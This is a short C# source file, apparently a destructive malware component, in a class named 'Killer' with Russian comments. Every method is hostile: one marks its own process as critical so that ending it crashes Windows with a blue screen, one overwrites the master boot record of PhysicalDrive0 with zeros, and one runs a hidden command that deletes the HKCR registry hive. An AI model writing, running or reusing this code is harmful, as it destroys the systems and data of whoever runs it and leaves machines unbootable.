using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace VirsCh
{
    class Killer
    {
        // Регистрация DLL
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess,
            uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
            uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass,
            ref int processInformation, int processInformationLength);

        // Вызов синего экрана
        static public void BSOD()
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;

            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        // Удоление MBR
        static public void MBR()
        {
            const uint GenericAll = 0x10000000;
            const uint FileShareRead = 0x1;
            const uint FileShareWrite = 0x2;
            const uint OpenExisting = 0x3;
            const uint MbrSize = 512u;

            var mbrData = new byte[MbrSize];

            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite,
                IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);

            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }

        // Удоление риестра
        static public void RegFuck()
        {
            ProcessStartInfo reg_kill = new ProcessStartInfo();
            reg_kill.FileName = "cmd.exe";
            reg_kill.WindowStyle = ProcessWindowStyle.Hidden;
            reg_kill.Arguments = @"/k reg delete HKCR /f";
            Process.Start(reg_kill);
        }
    }
}